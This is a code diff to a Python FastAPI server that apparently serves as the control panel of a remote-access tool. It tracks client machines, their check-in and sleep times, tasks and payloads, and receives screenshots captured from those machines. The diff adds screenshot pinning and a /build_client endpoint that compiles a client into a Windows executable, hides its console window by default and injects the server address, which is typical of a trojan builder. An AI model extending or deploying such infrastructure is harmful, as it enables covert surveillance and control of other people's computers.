@@ -8,6 +8,12 @@ import time
 
 from fastapi import FastAPI
 from fastapi.middleware.cors import CORSMiddleware
+from fastapi.responses import FileResponse
+import subprocess
+import shutil
+import tempfile
+import sys
+import re
 
 app = FastAPI()
 
@@ -50,6 +56,8 @@ db = TinyDB(DB_FILE)
 results_table = db.table("results")
 payloads_table = db.table("payloads")
 machine_configs_table = db.table("machine_configs")
+# persistent table for screenshot metadata (pinned flag etc.)
+screenshots_table = db.table("screenshots")
 
 # ensure payloads directory for serving files
 PAYLOADS_PATH = os.path.join(os.path.dirname(__file__), "payloads")
@@ -58,6 +66,10 @@ os.makedirs(PAYLOADS_PATH, exist_ok=True)
 # ensure screenshots directory
 SCREENSHOTS_PATH = os.path.join(os.path.dirname(__file__), "screenshots")
 os.makedirs(SCREENSHOTS_PATH, exist_ok=True)
+
+# builds dir for generated executables
+BUILDS_PATH = os.path.join(DB_PATH, 'builds')
+os.makedirs(BUILDS_PATH, exist_ok=True)
 
 
 @app.on_event("startup")
@@ -82,6 +94,16 @@ def load_existing_screenshots():
                     rec_id = os.path.splitext(fname)[0]
                     ts = os.path.getmtime(path)
                     rec = {"id": rec_id, "task_id": None, "machine_id": mid, "timestamp": ts, "path": path, "image_b64": img_b64}
+                    # load pinned flag from DB if present
+                    try:
+                        q = Query()
+                        meta = screenshots_table.search(q.id == rec_id)
+                        if meta:
+                            rec['pinned'] = bool(meta[0].get('pinned'))
+                        else:
+                            rec['pinned'] = False
+                    except Exception:
+                        rec['pinned'] = False
                     entries.append(rec)
                 except Exception:
                     continue
@@ -218,7 +240,7 @@ def get_clients_status():
         secs_until = None
         if sleeping_until is not None and sleeping_until > now:
             secs_until = int(sleeping_until - now)
-        out[m] = {"last_seen": last_seen, "sleeping_until": sleeping_until, "secs_until": secs_until, "has_task": has_task}
+        out[m] = {"last_seen": last_seen, "sleeping_until": sleeping_until, "secs_until": secs_until, "has_task": has_task, "periodic_screenshots": bool(s.get("periodic_screenshots", False))}
     return {"clients_status": out}
 
 
@@ -346,18 +368,28 @@ def upload_screenshot(payload: UploadScreenshot):
     except Exception as e:
         return {"status": "error", "reason": str(e)}
 
-    rec = {"id": rec_id, "task_id": tid, "machine_id": mid, "timestamp": now, "path": path, "image_b64": b64}
+    rec = {"id": rec_id, "task_id": tid, "machine_id": mid, "timestamp": now, "path": path, "image_b64": b64, "pinned": False}
     screenshots_store.setdefault(mid, []).append(rec)
+    # persist metadata to TinyDB so 'pinned' survives restarts
+    try:
+        q = Query()
+        screenshots_table.upsert({"id": rec_id, "machine_id": mid, "path": path, "timestamp": now, "pinned": False}, q.id == rec_id)
+    except Exception:
+        pass
 
     # enforce per-machine retention policy (prune oldest screenshots when over limit)
     cfg = machine_configs.get(mid, {})
     limit = cfg.get('max_screen_images', DEFAULT_MAX_SCREEN_IMAGES)
     lst = screenshots_store.get(mid, [])
     if limit is not None and len(lst) > limit:
-        # remove oldest entries (from the front)
+        # Prefer to keep pinned screenshots. Remove oldest non-pinned entries first.
         remove_count = len(lst) - limit
-        to_remove = lst[:remove_count]
-        remaining = lst[remove_count:]
+        # sort by timestamp ascending (oldest first)
+        sorted_by_time = sorted(lst, key=lambda r: r.get('timestamp', 0))
+        non_pinned = [r for r in sorted_by_time if not r.get('pinned')]
+        to_remove = non_pinned[:remove_count]
+        # If there aren't enough non-pinned to remove, we'll remove what we can and leave pinned ones.
+        remaining = [r for r in sorted_by_time if r not in to_remove]
         # delete files for removed screenshots
         for r in to_remove:
             try:
@@ -366,6 +398,12 @@ def upload_screenshot(payload: UploadScreenshot):
                     os.remove(p)
             except Exception:
                 pass
+            try:
+                q = Query()
+                screenshots_table.remove(q.id == r.get('id'))
+            except Exception:
+                pass
+        # preserve original append order (most recent last)
         screenshots_store[mid] = remaining
     return {"status": "uploaded", "screenshot": {"id": rec_id, "timestamp": now}}
 
@@ -386,7 +424,7 @@ def list_screenshots(machine_id: str):
     """Return list of stored screenshots metadata for a machine (most recent last)."""
     lst = screenshots_store.get(machine_id) or []
     # return metadata including the base64 image so the UI can render thumbnails
-    out = [{"id": r.get("id"), "task_id": r.get("task_id"), "timestamp": r.get("timestamp"), "path": r.get("path"), "image_b64": r.get('image_b64')} for r in lst]
+    out = [{"id": r.get("id"), "task_id": r.get("task_id"), "timestamp": r.get("timestamp"), "path": r.get("path"), "image_b64": r.get('image_b64'), "pinned": bool(r.get('pinned'))} for r in lst]
     return {"screenshots": out}
 
 
@@ -405,6 +443,9 @@ def delete_screenshot(id: str):
             break
     if not found:
         return {"deleted": False, "reason": "not_found"}
+    # do not allow deleting a pinned screenshot
+    if found.get('pinned'):
+        return {"deleted": False, "reason": "pinned"}
     # remove file if present
     try:
         p = found.get('path')
@@ -417,6 +458,11 @@ def delete_screenshot(id: str):
         screenshots_store[found_mid] = [r for r in screenshots_store.get(found_mid, []) if r.get('id') != id]
         if not screenshots_store[found_mid]:
             del screenshots_store[found_mid]
+    try:
+        q = Query()
+        screenshots_table.remove(q.id == id)
+    except Exception:
+        pass
     return {"deleted": True, "id": id}
 
 
@@ -431,6 +477,37 @@ def toggle_periodic_screenshots(machine_id: str, enabled: bool = True):
         clients_status.setdefault(machine_id, {})
     clients_status[machine_id]["periodic_screenshots"] = bool(enabled)
     return {"status": "ok", "machine_id": machine_id, "periodic_screenshots": clients_status[machine_id]["periodic_screenshots"]}
+
+
+@app.post("/screenshot_pin")
+def screenshot_pin(id: str, pinned: bool = True):
+    """Set or clear the 'pinned' flag for a screenshot. Pinned screenshots won't be pruned or deleted."""
+    found = None
+    found_mid = None
+    for mid, lst in screenshots_store.items():
+        for r in lst:
+            if r.get('id') == id:
+                found = r
+                found_mid = mid
+                break
+        if found:
+            break
+    if not found:
+        return {"status": "not_found", "id": id}
+    try:
+        found['pinned'] = bool(pinned)
+        # reflect change in the store
+        if found_mid:
+            screenshots_store[found_mid] = [r if r.get('id') != id else found for r in screenshots_store.get(found_mid, [])]
+        # persist change to TinyDB
+        try:
+            q = Query()
+            screenshots_table.upsert({"id": id, "machine_id": found_mid, "path": found.get('path'), "timestamp": found.get('timestamp'), "pinned": found['pinned']}, q.id == id)
+        except Exception:
+            pass
+        return {"status": "ok", "id": id, "pinned": found['pinned']}
+    except Exception:
+        return {"status": "error", "id": id}
 
 
 class MachineConfig(BaseModel):
@@ -605,6 +682,79 @@ def db_stats():
     """Return lightweight statistics about the tinydb results table."""
     count = len(results_table)
     return {"count": count, "db_file": DB_FILE}
+
+
+@app.post("/build_client")
+def build_client(server_url: Optional[str] = None, onefile: bool = True, console: bool = False):
+    """Build the Python `client.py` into a Windows executable using PyInstaller.
+
+    - `server_url` (optional): if provided, it will be injected into the built client as `SERVER_URL`.
+    - `onefile` (bool): whether to build a single-file executable (default: true).
+    - `console` (bool): whether to keep the console window (default: false).
+
+    Returns a direct file response with the built exe on success, or JSON with error/info on failure.
+    """
+    # prepare build workspace
+    build_id = str(uuid.uuid4())
+    build_dir = os.path.join(BUILDS_PATH, build_id)
+    os.makedirs(build_dir, exist_ok=True)
+    try:
+        # read original client.py
+        src_path = os.path.join(os.path.dirname(__file__), 'client.py')
+        if not os.path.exists(src_path):
+            return {"status": "error", "reason": "client.py not found on server"}
+        with open(src_path, 'r', encoding='utf-8') as f:
+            src = f.read()
+
+        # inject server_url if provided
+        if server_url:
+            su = server_url
+            if not su.endswith('/'):
+                su = su + '/'
+            # replace a simple SERVER_URL assignment line
+            src = re.sub(r'SERVER_URL\s*=\s*".*?"', f'SERVER_URL = "{su}"', src)
+
+        # write working client file
+        work_py = os.path.join(build_dir, 'client_build.py')
+        with open(work_py, 'w', encoding='utf-8') as f:
+            f.write(src)
+
+        # prepare pyinstaller paths
+        distdir = os.path.join(build_dir, 'dist')
+        workpath = os.path.join(build_dir, 'build')
+        specpath = os.path.join(build_dir, 'spec')
+        os.makedirs(distdir, exist_ok=True)
+        os.makedirs(workpath, exist_ok=True)
+        os.makedirs(specpath, exist_ok=True)
+
+        # build command: use current python to run PyInstaller module
+        cmd = [sys.executable, '-m', 'PyInstaller']
+        if onefile:
+            cmd.append('--onefile')
+        if not console:
+            cmd.append('--noconsole')
+        cmd.extend(['--noconfirm', f'--distpath={distdir}', f'--workpath={workpath}', f'--specpath={specpath}', work_py])
+
+        # run PyInstaller
+        proc = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, timeout=900)
+        if proc.returncode != 0:
+            return {"status": "error", "reason": "build_failed", "log": proc.stdout}
+
+        # find resulting executable
+        exe_files = [fn for fn in os.listdir(distdir) if fn.lower().endswith('.exe') or fn.lower().endswith('.bin') or fn.lower().endswith('.exe')]
+        if not exe_files:
+            # include log to help debugging
+            return {"status": "error", "reason": "no_exe_found", "log": proc.stdout}
+        exe_name = exe_files[0]
+        exe_path = os.path.join(distdir, exe_name)
+
+        # return file response for download
+        return FileResponse(exe_path, media_type='application/octet-stream', filename=exe_name)
+
+    except subprocess.TimeoutExpired:
+        return {"status": "error", "reason": "build_timeout"}
+    except Exception as e:
+        return {"status": "error", "reason": str(e)}
 
 
 @app.delete("/result")
